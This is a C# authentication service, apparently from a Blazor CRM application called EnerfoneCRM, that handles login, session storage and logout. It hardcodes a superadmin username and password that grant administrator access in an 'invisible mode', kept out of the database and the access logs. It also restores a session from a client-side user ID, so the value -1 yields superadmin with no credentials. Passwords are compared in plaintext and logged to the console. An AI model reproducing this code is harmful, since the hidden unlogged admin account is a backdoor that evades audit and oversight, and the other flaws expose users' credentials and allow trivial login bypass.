using EnerfoneCRM.Data;
using EnerfoneCRM.Models;
using Microsoft.EntityFrameworkCore;
using Blazored.SessionStorage;
using Blazored.LocalStorage;

namespace EnerfoneCRM.Services;

public class AuthService
{
    private readonly DbContextProvider _dbContextProvider;
    private readonly ISessionStorageService _sessionStorage;
    private readonly ILocalStorageService _localStorage;
    private readonly LogAccesoService _logAccesoService;
    private Usuario? _usuarioActual;

    // Usuario superadmin hardcodeado (sin registro en BD ni logs)
    private const string SUPERADMIN_USERNAME = "superadmin";
    private const string SUPERADMIN_PASSWORD = "SuperAdmin2026!";

    public AuthService(
        DbContextProvider dbContextProvider, 
        ISessionStorageService sessionStorage,
        ILocalStorageService localStorage,
        LogAccesoService logAccesoService)
    {
        _dbContextProvider = dbContextProvider;
        _sessionStorage = sessionStorage;
        _localStorage = localStorage;
        _logAccesoService = logAccesoService;
    }

    public Usuario? UsuarioActual => _usuarioActual;
    public bool EstaAutenticado => _usuarioActual != null;
    public bool EsAdministrador => _usuarioActual?.Rol == "Administrador";
    public bool EsSuperAdmin => _usuarioActual?.NombreUsuario == SUPERADMIN_USERNAME;
    public bool EsDirectorComercial => _usuarioActual?.Rol == "Director comercial";
    public bool EsJefeVentas => _usuarioActual?.Rol == "Jefe de ventas";
    public bool EsGestor => _usuarioActual?.Rol == "Gestor";
    public bool EsComercializadora => _usuarioActual?.Rol == "Comercializadora";
    public bool EsUsuario => _usuarioActual?.Rol == "Colaborador";

    public event Action? OnAuthStateChanged;

    public async Task<bool> CargarSesionAsync()
    {
        // Si ya hay un usuario autenticado, no hacer nada (idempotente)
        // Esto evita disparar eventos múltiples veces
        if (_usuarioActual != null)
        {
            return true;
        }

        try
        {
            // Primero intentar desde SessionStorage (sesión actual)
            var usuarioId = await _sessionStorage.GetItemAsync<int?>("usuarioId");
            
            // Si no hay en sesión, intentar desde LocalStorage (recordarme)
            if (!usuarioId.HasValue || usuarioId.Value <= 0)
            {
                usuarioId = await _localStorage.GetItemAsync<int?>("usuarioId");
                
                // Si se encontró en localStorage, también guardarlo en sessionStorage
                if (usuarioId.HasValue && usuarioId.Value > 0)
                {
                    await _sessionStorage.SetItemAsync("usuarioId", usuarioId.Value);
                }
            }
            
            if (usuarioId.HasValue)
            {
                // Si es el ID especial del superadmin (-1), recrear el usuario
                if (usuarioId.Value == -1)
                {
                    _usuarioActual = new Usuario
                    {
                        Id = -1,
                        NombreUsuario = SUPERADMIN_USERNAME,
                        Nombre = "Super",
                        Apellidos = "Admin",
                        Email = "superadmin@system.local",
                        Rol = "Administrador",
                        Activo = true,
                        ExcluirLogAcceso = true
                    };
                    Console.WriteLine($"[AUTH] SUPERADMIN restaurado de sesión - modo invisible");
                    NotificarCambioAutenticacion();
                    return true;
                }
                
                // Usuario normal de BD
                if (usuarioId.Value > 0)
                {
                    await using var context = _dbContextProvider.CreateDbContext();
                    _usuarioActual = await context.Usuarios.FindAsync(usuarioId.Value);
                    if (_usuarioActual != null)
                    {
                        Console.WriteLine($"[AUTH] Usuario restaurado de sesión: {_usuarioActual.NombreUsuario}");
                        NotificarCambioAutenticacion();
                        return true;
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[AUTH] Error al cargar sesión: {ex.Message}");
        }
        return false;
    }

    public async Task<(bool exito, string mensaje)> Login(string nombreUsuario, string password)
    {
        try
        {
            // Verificar si es el superadmin hardcodeado
            if (nombreUsuario == SUPERADMIN_USERNAME && password == SUPERADMIN_PASSWORD)
            {
                Console.WriteLine($"[AUTH] Login SUPERADMIN detectado - modo invisible activado");
                
                // Crear usuario superadmin sin registrar en BD
                _usuarioActual = new Usuario
                {
                    Id = -1, // ID especial para identificarlo internamente
                    NombreUsuario = SUPERADMIN_USERNAME,
                    Nombre = "Super",
                    Apellidos = "Admin",
                    Email = "superadmin@system.local",
                    Rol = "Administrador",
                    Activo = true,
                    ExcluirLogAcceso = true
                };
                
                Console.WriteLine($"[AUTH] SUPERADMIN autenticado - SIN registro en logs");
                NotificarCambioAutenticacion();
                return (true, "Login exitoso");
            }

            await using var context = _dbContextProvider.CreateDbContext();
            Console.WriteLine($"[AUTH] Intentando login para: {nombreUsuario}");
            
            var usuario = await context.Usuarios
                .FirstOrDefaultAsync(u => u.NombreUsuario == nombreUsuario);

            if (usuario == null)
            {
                Console.WriteLine($"[AUTH] Usuario no encontrado: {nombreUsuario}");
                return (false, "Usuario no encontrado");
            }

            Console.WriteLine($"[AUTH] Usuario encontrado. Rol: {usuario.Rol}");
            Console.WriteLine($"[AUTH] Password en BD: '{usuario.PasswordHash}'");
            Console.WriteLine($"[AUTH] Password ingresado: '{password}'");

            // Verificar si el usuario está activo
            if (!usuario.Activo)
            {
                Console.WriteLine($"[AUTH] Usuario inactivo: {nombreUsuario}");
                return (false, "Tu cuenta está pendiente de activación. Contacta con el administrador.");
            }

            // Comparación directa de contraseñas en texto plano
            if (usuario.PasswordHash != password)
            {
                Console.WriteLine($"[AUTH] Contraseña incorrecta");
                return (false, "Contraseña incorrecta");
            }

            _usuarioActual = usuario;
            Console.WriteLine($"[AUTH] Login exitoso. Usuario autenticado: {_usuarioActual.NombreUsuario}");
            
            // Registrar el acceso en el log (solo si no está excluido)
            if (!usuario.ExcluirLogAcceso)
            {
                await _logAccesoService.RegistrarAccesoAsync(_usuarioActual.Id, _usuarioActual.NombreUsuario, _usuarioActual.Rol);
            }
            
            NotificarCambioAutenticacion();

            return (true, "Login exitoso");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[AUTH] Error en login: {ex.Message}");
            return (false, $"Error: {ex.Message}");
        }
    }

    public async Task GuardarSesionAsync(bool recordarMe = false)
    {
        try
        {
            if (_usuarioActual != null)
            {
                // Siempre guardar en SessionStorage
                await _sessionStorage.SetItemAsync("usuarioId", _usuarioActual.Id);
                Console.WriteLine($"[AUTH] Sesión guardada en SessionStorage con ID: {_usuarioActual.Id}");
                
                // Si marcó "Recordarme", también guardar en LocalStorage
                if (recordarMe)
                {
                    await _localStorage.SetItemAsync("usuarioId", _usuarioActual.Id);
                    Console.WriteLine($"[AUTH] Sesión guardada en LocalStorage (Recordarme) con ID: {_usuarioActual.Id}");
                }
                else
                {
                    // Si no marcó "Recordarme", limpiar LocalStorage por si acaso
                    await _localStorage.RemoveItemAsync("usuarioId");
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[AUTH] Error al guardar sesión: {ex.Message}");
        }
    }

    public async Task Logout()
    {
        _usuarioActual = null;
        try
        {
            await _sessionStorage.RemoveItemAsync("usuarioId");
            await _localStorage.RemoveItemAsync("usuarioId");
            // NO limpiar las credenciales guardadas (recordar_usuario y recordar_password)
            // para que persistan incluso después del logout
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[AUTH] Error al limpiar sesión: {ex.Message}");
        }
        Console.WriteLine("[AUTH] Sesión cerrada");
        NotificarCambioAutenticacion();
    }

    private void NotificarCambioAutenticacion()
    {
        OnAuthStateChanged?.Invoke();
    }
}
